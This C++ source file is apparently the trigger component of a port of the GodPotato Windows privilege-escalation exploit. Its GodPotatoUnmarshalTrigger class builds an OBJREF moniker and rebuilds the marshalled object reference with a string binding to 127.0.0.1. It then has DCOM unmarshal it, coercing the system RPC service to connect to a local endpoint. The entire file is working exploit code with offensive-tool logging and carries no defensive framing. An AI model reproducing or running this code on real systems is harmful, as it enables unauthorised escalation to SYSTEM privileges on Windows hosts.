#include "Trigger.h"

#include <objbase.h>
#include <wincrypt.h>

#include <algorithm>
#include <iostream>
#include <stdexcept>

#include "log.h"

#ifdef _MSC_VER
#pragma comment(lib, "Crypt32.lib")
#endif

namespace
{
class SimpleUnknown final : public IUnknown
{
public:
    SimpleUnknown() : refCount(1) {}

    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) override
    {
        if (!ppvObject)
        {
            return E_POINTER;
        }

        if (riid == IID_IUnknown)
        {
            *ppvObject = static_cast<IUnknown*>(this);
            AddRef();
            return S_OK;
        }

        *ppvObject = nullptr;
        return E_NOINTERFACE;
    }

    ULONG STDMETHODCALLTYPE AddRef() override
    {
        return ++refCount;
    }

    ULONG STDMETHODCALLTYPE Release() override
    {
        ULONG next = --refCount;
        if (next == 0)
        {
            delete this;
        }
        return next;
    }

private:
    ULONG refCount;
};

class CoInitGuard
{
public:
    CoInitGuard() : hr(CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED)) {}
    ~CoInitGuard()
    {
        if (SUCCEEDED(hr))
        {
            CoUninitialize();
        }
    }

    HRESULT Result() const { return hr; }

private:
    HRESULT hr;
};

std::wstring GuidToString(const GUID& guid)
{
    wchar_t buffer[64] = {0};
    if (StringFromGUID2(guid, buffer, static_cast<int>(std::size(buffer))) > 0)
    {
        return buffer;
    }
    return L"";
}

bool Base64DecodeWide(const std::wstring& input, std::vector<uint8_t>& output)
{
    DWORD required = 0;
    if (!CryptStringToBinaryW(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &required, nullptr, nullptr))
    {
        return false;
    }

    output.resize(required);
    if (!CryptStringToBinaryW(input.c_str(), 0, CRYPT_STRING_BASE64, output.data(), &required, nullptr, nullptr))
    {
        return false;
    }
    output.resize(required);
    return true;
}

std::string HResultToString(HRESULT hr)
{
    char* buffer = nullptr;
    DWORD flags = FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
    DWORD size = FormatMessageA(flags, nullptr, hr, 0, reinterpret_cast<char*>(&buffer), 0, nullptr);
    std::string result = (size && buffer) ? std::string(buffer, size) : std::string();
    if (buffer)
    {
        LocalFree(buffer);
    }
    return result;
}
} // namespace

const GUID GodPotatoUnmarshalTrigger::IID_IUnknown_Guid =
    {0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
const wchar_t* const GodPotatoUnmarshalTrigger::Binding = L"127.0.0.1";
const TowerProtocol GodPotatoUnmarshalTrigger::TowerProto = TowerProtocol::EPM_PROTOCOL_TCP;

GodPotatoUnmarshalTrigger::GodPotatoUnmarshalTrigger(GodPotatoContext* context)
    : godPotatoContext(context), pIUnknown(nullptr), bindCtx(nullptr), moniker(nullptr)
{
    if (!godPotatoContext || !godPotatoContext->isStarted())
    {
        throw std::runtime_error("GodPotatoContext was not initialized");
    }

    pIUnknown = new SimpleUnknown();

    HRESULT hr = CreateBindCtx(0, &bindCtx);
    if (FAILED(hr))
    {
        throw std::runtime_error("CreateBindCtx failed");
    }

    hr = CreateObjrefMoniker(pIUnknown, &moniker);
    if (FAILED(hr))
    {
        throw std::runtime_error("CreateObjrefMoniker failed");
    }
}

GodPotatoUnmarshalTrigger::~GodPotatoUnmarshalTrigger()
{
    if (moniker)
    {
        moniker->Release();
    }
    if (bindCtx)
    {
        bindCtx->Release();
    }
    if (pIUnknown)
    {
        pIUnknown->Release();
    }
}

HRESULT GodPotatoUnmarshalTrigger::Trigger()
{
    CoInitGuard coInit;
    if (FAILED(coInit.Result()) && coInit.Result() != RPC_E_CHANGED_MODE)
    {
        return coInit.Result();
    }

    if (!moniker || !bindCtx)
    {
        return E_FAIL;
    }

    LPOLESTR displayName = nullptr;
    HRESULT hr = moniker->GetDisplayName(bindCtx, nullptr, &displayName);
    if (FAILED(hr))
    {
        return hr;
    }

    std::wstring display(displayName ? displayName : L"");
    CoTaskMemFree(displayName);
    {
        LOG_INFO_WSTREAM << L"[*] Moniker display name length: " << display.size() << std::endl;
    }

    const std::wstring prefix = L"objref:";
    if (display.rfind(prefix, 0) == 0)
    {
        display = display.substr(prefix.size());
    }

    display.erase(std::remove(display.begin(), display.end(), L':'), display.end());

    std::vector<uint8_t> objrefBytes;
    if (!Base64DecodeWide(display, objrefBytes))
    {
        return E_FAIL;
    }
    {
        LOG_INFO_STREAM << "[*] Decoded objref bytes: " << objrefBytes.size() << std::endl;
    }

    ObjRef tmpObjRef(objrefBytes);
    if (!tmpObjRef.StandardObjRef)
    {
        return E_FAIL;
    }
    {
        LOG_INFO_STREAM << "[*] Parsed ObjRef OK" << std::endl;
    }

    {
        LOG_INFO_WSTREAM << L"[*] DCOM obj GUID: " << GuidToString(tmpObjRef.Guid) << std::endl;
        LOG_INFO_WSTREAM << L"[*] DCOM obj IPID: " << GuidToString(tmpObjRef.StandardObjRef->IPID) << std::endl;
        LOG_INFO_STREAM << "[*] DCOM obj OXID: 0x" << std::hex << tmpObjRef.StandardObjRef->OXID << std::dec << std::endl;
        LOG_INFO_STREAM << "[*] DCOM obj OID: 0x" << std::hex << tmpObjRef.StandardObjRef->OID << std::dec << std::endl;
        LOG_INFO_STREAM << "[*] DCOM obj Flags: 0x" << std::hex << tmpObjRef.StandardObjRef->Flags << std::dec << std::endl;
        LOG_INFO_STREAM << "[*] DCOM obj PublicRefs: 0x" << std::hex << tmpObjRef.StandardObjRef->PublicRefs << std::dec << std::endl;
    }

    ObjRef objRef(
        IID_IUnknown_Guid,
        std::make_unique<ObjRef::Standard>(
            0,
            1,
            tmpObjRef.StandardObjRef->OXID,
            tmpObjRef.StandardObjRef->OID,
            tmpObjRef.StandardObjRef->IPID,
            std::make_unique<ObjRef::DualStringArray>(
                std::make_unique<ObjRef::StringBinding>(TowerProto, std::wstring(Binding)),
                std::make_unique<ObjRef::SecurityBinding>(0x0a, 0xffff, std::wstring())
            )
        )
    );

    std::vector<uint8_t> data = objRef.GetBytes();
    {
        LOG_INFO_STREAM << "[*] Marshal Object bytes len: " << data.size() << std::endl;
        LOG_INFO_STREAM << "[*] UnMarshal Object" << std::endl;
    }

    void* ppv = nullptr;
    HRESULT hrUnmarshal = UnmarshalDCOM::UnmarshalObject(data, &ppv);
    if (FAILED(hrUnmarshal))
    {
        LOG_ERROR_STREAM << "[!] UnMarshal failed: 0x" << std::hex << hrUnmarshal << std::dec << " "
                  << HResultToString(hrUnmarshal) << std::endl;
    }

    if (ppv)
    {
        static_cast<IUnknown*>(ppv)->Release();
    }

    return hrUnmarshal;
}


